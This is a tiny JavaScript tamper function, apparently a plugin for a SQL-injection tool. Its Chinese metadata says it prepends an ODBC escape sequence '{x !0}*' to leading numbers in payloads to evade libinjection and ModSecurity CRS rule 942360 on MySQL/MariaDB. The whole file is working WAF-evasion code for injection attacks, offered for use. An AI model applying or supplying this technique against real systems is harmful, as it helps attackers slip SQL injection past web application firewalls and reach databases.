//@name: ODBC转义前缀
//@usage: payload
//@enable: false
//@description: 前导数字加{x !0}*前缀（ODBC转义序列，绕libinjection/CRS 942360，MySQL/MariaDB）
function tamper(payload){ return payload ? payload.replace(/^([+-]?\d+)(?![\w.])/, '{x !0}*$1') : payload; }